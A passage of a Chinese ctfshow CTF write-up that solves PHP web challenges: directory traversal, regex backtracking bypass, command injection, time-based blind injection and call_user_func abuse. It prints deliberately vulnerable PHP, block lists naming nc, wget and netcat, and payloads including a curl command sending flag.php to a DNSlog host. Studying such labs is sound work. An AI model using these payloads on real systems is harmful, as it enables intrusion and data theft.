title="17、get_defined_vars获取已经定义的变量（常用）"></a>17、get_defined_vars获取已经定义的变量（常用）</h2><h2 id="18、目录穿越"><a href="#18、目录穿越" class="headerlink" title="18、目录穿越"></a>18、目录穿越</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写） payload: &#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 查看源代码获得 flag</p><h2 id="19、正则表达式"><a href="#19、正则表达式" class="headerlink" title="19、正则表达式"></a>19、正则表达式</h2><h3 id="禁止贪婪"><a href="#禁止贪婪" class="headerlink" title="禁止贪婪"></a>禁止贪婪</h3><p>正则表达式在进行重复匹配时，默认是贪婪匹配模式，也就是说会尽量匹配更多内容，但是有的时候我们并不希望他匹配更多内容，这时可以通过?进行修饰来禁止重复匹配。</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>*?</td><td>重复任意次，但尽可能少重复</td></tr><tr><td>+?</td><td>重复 1 次或更多次，但尽可能少重复</td></tr><tr><td>??</td><td>重复 0 次或 1 次，但尽可能少重复</td></tr><tr><td>{n,m}?</td><td>重复 n 到 m 次，但尽可能少重复</td></tr><tr><td>{n,}?</td><td>重复 n 次以上，但尽可能少重复</td></tr></tbody></table><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>f&#x3D;ctfshow</p><h3 id="正则表达式是溢出"><a href="#正则表达式是溢出" class="headerlink" title="正则表达式是溢出"></a>正则表达式是溢出</h3><p> <a href="https://www.laruence.com/2010/06/08/1579.html">https://www.laruence.com/2010/06/08/1579.html</a> </p><p>大概意思就是在php中正则表达式进行<strong>非贪婪匹配</strong>时需要不断压栈，所有有限制，超过限制直接返回false</p><p>贪婪匹配不会有限制</p><pre class="line-numbers language-none"><code class="language-none">#payload:&lt;?phpecho str_repeat(&#39;very&#39;, &#39;250000&#39;).&#39;36Dctfshow&#39;;#post发送过去就OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="20、位运算符结合顺序"><a href="#20、位运算符结合顺序" class="headerlink" title="20、位运算符结合顺序"></a>20、位运算符结合顺序</h2><p><img src="/images/image-20220810164827564-1662567087525.png" alt="image-20220810164827564"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;</code></p><p>&#x3D;&#x3D;相当于&#x3D;&#x3D;&gt;（由于结合顺序）</p><p><code>($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag) || $username ===&quot;admin&quot;</code></p><p>payload：<code>?code=admin&amp;username=admin&amp;password=1</code></p><h2 id="21、命令执行（-96-96-相当于shell-exec），没有回显"><a href="#21、命令执行（-96-96-相当于shell-exec），没有回显" class="headerlink" title="21、命令执行（&#96;&#96;相当于shell_exec），没有回显"></a>21、命令执行（&#96;&#96;相当于shell_exec），没有回显</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6个字母都还不够呀?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于只是截取$F的前六个字符传入eval，没有修改$F,所以可以传入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token function">curl</span> http://t162d4.ceye.io/<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php<span class="token operator">|</span><span class="token function">grep</span> ctfshow<span class="token operator">|</span>base64<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样后面的命令就可以执行，但是没有回显</p><h3 id="DNSlog回显："><a href="#DNSlog回显：" class="headerlink" title="DNSlog回显："></a>DNSlog回显：</h3><p><img src="/images/image-20220810201236230-1662567087526.png" alt="image-20220810201236230"></p><p>然后DNSlog一次只能回显64个字节，并且没有特殊字符，所以</p><p>1、cat flag.php|grep ctfshow 定位到有ctfshow的行</p><p>2、cat flag.php|grep ctfshow|base64将结果进行base64输出</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">JGZsYWc9ImN0ZnNob3d7YjJkOTkwNjUtMjIzYS00N2I5LTg0YWQtMDYxYzkzY2ZjYzNmfSI7Cg==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20220810201427968-1662567087526.png" alt="image-20220810201427968"></p><p>也可以使用：</p><p><code>?F=$F;+ping nl flag.php|awk &#39;NR==16&#39;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;.t162d4.ceye.io</code></p><p><code>awk &#39;NR==16&#39;</code>读取第16行</p><p><code>tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;</code>只显示字母和数字（DNSlog只能有数字和字母）</p><p>得到：</p><p><img src="/images/image-20220811102007651-1662567087526.png" alt="image-20220811102007651"></p><p>15flag1ctfshow9c4dba61af4</p><p>16flag2349539f575416e033ded1</p><p>ctfshow{9c4dba61-af43-4953-9f57-5416e033ded1} 间隔为8-4-4-4-12</p><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?c=ls /|tee 1</code></p><p><code>?c=cat /f149_15_h3r3|tee 2</code></p><p>访问url&#x2F;1、url&#x2F;2下载打开即可</p><p><img src="/images/image-20220811103916986-1662567087526.png" alt="image-20220811103916986"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">而tee命令就是先显示内容，在重定向内容<span class="token builtin class-name">echo</span> <span class="token number">123</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token number">1</span>.txt     <span class="token comment">#覆盖</span><span class="token number">123</span><span class="token builtin class-name">echo</span> <span class="token number">123</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> <span class="token number">1</span>.txt    <span class="token comment">#追加  </span><span class="token number">123</span><span class="token function">cat</span> <span class="token number">1</span>.txt <span class="token number">123</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h3 id="最后的办法：时间盲注"><a href="#最后的办法：时间盲注" class="headerlink" title="最后的办法：时间盲注"></a>最后的办法：时间盲注</h3><p>bash中的if语法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> / <span class="token operator">|</span> <span class="token function">awk</span> <span class="token assign-left variable">NR</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-c</span> <span class="token number">1</span><span class="token variable">`</span></span> <span class="token operator">==</span> a <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span> <span class="token function">sleep</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">fi</span><span class="token comment">#if [condition] doing; then doing; fi </span><span class="token comment">#以fi为结尾</span><span class="token comment">#awk NR==1 取结果的第一行</span><span class="token comment">#cut -c 1 去第一个字符</span><span class="token comment">#``可以再次命令执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>盲注脚本:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#时间盲注，一般设置超时时间 requests.get(url=url+payload,timeout=(1.5,1.5))</span><span class="token comment">#try catch 接收超时信息然后进行</span><span class="token comment">#然后超时说明击中</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl <span class="token operator">=</span> <span class="token string">'http://667701e8-6c32-401a-a1b7-08d55c8f860d.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">0</span>            <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># f149_15_h3r3 #ascii码表</span>                k <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>                payload <span class="token operator">=</span> <span class="token string">"?c="</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"if [ `cat /f149_15_h3r3 | awk NR==</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> | cut -c </span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">` == </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string"> ];then sleep 2;fi"</span></span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">,</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    result <span class="token operator">+=</span> k                    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                    <span class="token keyword">if</span> k<span class="token operator">==</span><span class="token string">' '</span><span class="token punctuation">:</span>                        result<span class="token operator">+=</span><span class="token string">'\n'</span>                        flag<span class="token operator">=</span><span class="token number">1</span>                    <span class="token keyword">break</span>            <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        result <span class="token operator">+=</span> <span class="token string">" "</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>getflag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="22、call-user-func"><a href="#22、call-user-func" class="headerlink" title="22、call_user_func"></a>22、call_user_func</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将数组传递给<code>call_user_func</code>是调用类方法(静态和非静态)的特殊情况：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">myclass</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">say_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello!\n"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">say_hello_static</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello static!\n"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//Call static method</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'myclass'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'say_hello_static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Call object method</span><span class="token variable">$myobject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$myobject</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从PHP 5.2.3开始，可以使用字符串而不是数组来调用静态方法，例如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'myclass::say_hello_static'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以传参：</p><p>POST：<code>ctfshow=ctfshow::getFlag</code></p><p>或者 POST：<code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code></p><h2 id="23、弱类型比较"><a href="#23、弱类型比较" class="headerlink" title="23、弱类型比较"></a>23、弱类型比较</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$f1</span></span>(<span class="token interpolation"><span class="token variable">$f2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>intval($code) == 